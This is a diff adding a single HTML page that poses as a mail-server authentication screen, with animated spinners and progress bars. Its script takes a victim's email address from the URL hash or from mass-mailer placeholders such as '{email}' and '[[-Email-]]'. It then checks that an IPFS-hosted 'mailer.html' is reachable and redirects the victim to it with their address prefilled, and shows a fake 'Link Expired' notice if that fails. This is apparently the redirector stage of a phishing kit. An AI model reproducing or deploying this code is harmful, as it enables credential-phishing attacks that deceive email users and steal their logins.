@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>AUTHENTICATING Mail SERVER...</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8eb 100%);
+            color: #2d3748;
+        }
+
+        .loading-container {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            margin-bottom: 30px;
+        }
+
+        .spinner {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 8px solid transparent;
+            border-top-color: #3b82f6;
+            border-bottom-color: #3b82f6;
+            animation: spin 1.5s linear infinite;
+            box-shadow: 0 0 10px rgba(59, 130, 246, 0.3);
+        }
+
+        .spinner-inner {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            right: 15px;
+            bottom: 15px;
+            border-radius: 50%;
+            border: 6px solid transparent;
+            border-left-color: #60a5fa;
+            border-right-color: #60a5fa;
+            animation: spinReverse 2s linear infinite;
+        }
+
+        .spinner-core {
+            position: absolute;
+            top: 30px;
+            left: 30px;
+            right: 30px;
+            bottom: 30px;
+            border-radius: 50%;
+            border: 4px solid #93c5fd;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        .spinner-dot {
+            position: absolute;
+            top: 10px;
+            left: 50%;
+            width: 12px;
+            height: 12px;
+            margin-left: -6px;
+            background-color: #1d4ed8;
+            border-radius: 50%;
+            animation: orbit 1.5s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes spinReverse {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(-720deg); }
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 0.7; }
+            50% { transform: scale(1.05); opacity: 1; }
+        }
+
+        @keyframes orbit {
+            0% { transform: rotate(0deg) translateX(40px) rotate(0deg); }
+            100% { transform: rotate(360deg) translateX(40px) rotate(-360deg); }
+        }
+
+        .status-text {
+            font-size: 1.1rem;
+            font-weight: 500;
+            margin-top: 20px;
+            color: #4b5563;
+            position: relative;
+        }
+
+        .status-text::after {
+            content: '...';
+            position: absolute;
+            animation: dots 1.5s steps(5, end) infinite;
+        }
+
+        @keyframes dots {
+            0%, 20% { content: '.'; }
+            40% { content: '..'; }
+            60%, 100% { content: '...'; }
+        }
+
+        .progress-container {
+            width: 200px;
+            height: 4px;
+            background: #e5e7eb;
+            border-radius: 2px;
+            margin-top: 30px;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #3b82f6, #6366f1);
+            border-radius: 2px;
+            animation: progress 2s ease-in-out infinite;
+        }
+
+        @keyframes progress {
+            0% { width: 0%; margin-left: 0; }
+            50% { width: 100%; margin-left: 0; }
+            100% { width: 0%; margin-left: 100%; }
+        }
+
+        .expired-message {
+            color: #dc2626;
+            margin-top: 30px;
+            max-width: 300px;
+        }
+
+        .expired-message h1 {
+            font-size: 1.5rem;
+            margin-bottom: 10px;
+        }
+
+        .expired-message p {
+            margin: 5px 0;
+            color: #6b7280;
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-container">
+        <div class="spinner"></div>
+        <div class="spinner-inner"></div>
+        <div class="spinner-core"></div>
+        <div class="spinner-dot"></div>
+    </div>
+    
+    <div class="status-text" id="status-text">Initializing authentication</div>
+    
+    <div class="progress-container">
+        <div class="progress-bar"></div>
+    </div>
+
+    <script>
+        function checkAndRedirect() {
+            // Extract email from URL hash (e.g., #email=someone@example.com)
+            var hash = window.location.hash.substring(1);
+            var email = "{email}"; // Default to {email} placeholder
+            
+            if (hash) {
+                var hashParams = hash.split('=');
+                if (hashParams[0] === 'email') {
+                    email = decodeURIComponent(hashParams[1]);
+                }
+            }
+
+            // Support both placeholder formats
+            var encodedEmail = encodeURIComponent(email);
+            var ipfsURL = "https://bafybeidys4lteadkyfijzaizjrsmbwxdgebpxwd4qyfnguj2a7rd423b54.ipfs.dweb.link/mailer.html#" + encodedEmail;
+
+            // Update status text
+            document.getElementById('status-text').textContent = "Verifying server connection";
+
+            // Create a new XMLHttpRequest to check if the IPFS link is accessible
+            var xhr = new XMLHttpRequest();
+            xhr.open('HEAD', ipfsURL.replace('{email}', encodedEmail)
+                                  .replace('[[-Email-]]', encodedEmail), true);
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == 4) {
+                    if (xhr.status >= 200 && xhr.status < 300) {
+                        // Update status before redirect
+                        document.getElementById('status-text').textContent = "Connection verified";
+                        // Redirect if the IPFS content is accessible
+                        setTimeout(function() {
+                            window.location.href = ipfsURL.replace('{email}', encodedEmail)
+                                                        .replace('[[-Email-]]', encodedEmail);
+                        }, 1000);
+                    } else {
+                        // Show "Link Expired" if it fails
+                        document.querySelector('.loading-container').style.display = 'none';
+                        document.querySelector('.progress-container').style.display = 'none';
+                        document.getElementById('status-text').style.display = 'none';
+                        document.body.innerHTML += `
+                            <div class="expired-message">
+                                <h1>Link Expired</h1>
+                                <p>The authentication page is no longer available.</p>
+                                <p>Please contact support for assistance.</p>
+                            </div>
+                        `;
+                    }
+                }
+            };
+            xhr.send();
+        }
+
+        window.onload = function() {
+            // Start the animation first
+            setTimeout(checkAndRedirect, 500);
+        };
+    </script>
+</body>
+</html>
